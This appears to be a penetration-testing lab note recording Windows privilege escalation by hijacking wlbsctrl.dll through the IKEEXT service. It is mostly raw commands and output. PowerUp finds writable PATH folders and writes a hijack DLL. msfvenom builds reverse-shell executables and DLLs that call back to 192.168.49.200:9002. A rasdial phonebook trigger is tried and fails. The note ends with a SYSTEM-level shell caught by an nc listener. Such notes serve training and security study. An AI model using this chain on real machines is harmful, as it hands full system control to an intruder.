# 8 privesc\_3 wlbsctrl.dll hijack

```
[*] Checking %PATH% for potentially hijackable .dll locations...
HijackablePath : C:\Python\Scripts\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Python\Scripts\\wlbsctrl.dll'
                 -Command '...'

HijackablePath : C:\Python\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Python\\wlbsctrl.dll' -Command
                  '...'

Using https://infosecwriteups.com/ikeext-dll-hijacking-3aefe4dde7f5

# shell
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.200 LPORT=9002 -f exe -o kashz.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: kashz.exe

c:\Users\daisy> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Write-HijackDll -OutputFile 'C:\Python\Scripts\wlbsctrl.dll' -Command 'C:\Users\daisy\kashz.exe'}"
.bat launcher written to: C:\Python\Scripts\debug.bat
x64 DLL Hijacker written to: C:\Python\Scripts\wlbsctrl.dll

OutputFile          Architecture        BATLauncherPath     Command
----------          ------------        ---------------     -------
C:\Python\Script... x64                 C:\Python\Script... C:\Users\daisy\k...

# created file in path
# filename: rasphone.pbk
[IKEEXT]
MEDIA=rastapi
Port=VPN2-0
Device=Wan Miniport (IKEv2)
DEVICE=vpn
PhoneNumber=127.0.0.1

# running rasdial to execute dll
rasdial IKEEXT test test /PHONEBOOK:rasphone.pbk
Connecting to IKEEXT...

Remote Access error 797 - A connection to the remote computer could not be established because the modem was not found or was busy.  For further assistance, click More Info or search Help and Support Center for this error number.

For more help on this error:
        Type 'hh netcfg.chm'
        In help, click Troubleshooting, then Error Messages, then 797
		
# FAILED

# we can try creating dll using msfvenom and rebooting the machine to force execution of dell

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.200 LPORT=9002 -f dll -o wlbsctrl.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 8704 bytes
Saved as: wlbsctrl.dll

# copy it over to dir in PATH [c:\Python\Scripts | c:\Python]
$ rlwrap nc -lvnp 9002
listening on [any] 9002 ...
connect to [192.168.49.200] from (UNKNOWN) [192.168.200.44] 49159
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```
